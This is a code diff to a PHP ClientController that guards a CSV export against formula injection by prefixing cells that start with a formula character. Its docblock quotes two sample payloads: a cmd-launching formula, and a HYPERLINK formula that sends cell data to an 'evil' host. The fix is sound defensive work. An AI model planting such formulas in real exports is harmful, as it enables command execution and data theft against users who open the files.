@@ -335,7 +335,11 @@ class ClientController extends Controller
             $this->writeCsvRow($handle, $columns);
 
             foreach ($rows as $row) {
-                $this->writeCsvRow($handle, $row);
+                // Escape CSV formula injection — prefix dangerous first chars
+                // with single quote so Excel/Numbers/Sheets render them as
+                // literal text instead of executing =cmd|... formulas.
+                $sanitized = array_map([$this, 'escapeCsvFormula'], (array) $row);
+                $this->writeCsvRow($handle, $sanitized);
             }
 
             if (!rewind($handle)) {
@@ -352,6 +356,27 @@ class ClientController extends Controller
         } finally {
             fclose($handle);
         }
+    }
+
+    /**
+     * Prefix leading formula characters (=, +, -, @, tab, CR) with a
+     * single quote so spreadsheet apps treat the cell as text. This
+     * blocks CSV formula injection (CVE-style payloads like
+     * =cmd|'/c calc'!A1 or =HYPERLINK("http://evil/?x="&A1)).
+     */
+    private function escapeCsvFormula(string $value): string
+    {
+        if ($value === '') {
+            return $value;
+        }
+
+        $firstChar = $value[0];
+
+        if (in_array($firstChar, ['=', '+', '-', '@', "\t", "\r"], true)) {
+            return "'" . $value;
+        }
+
+        return $value;
     }
 
     private function writeCsvRow($handle, array $row): void
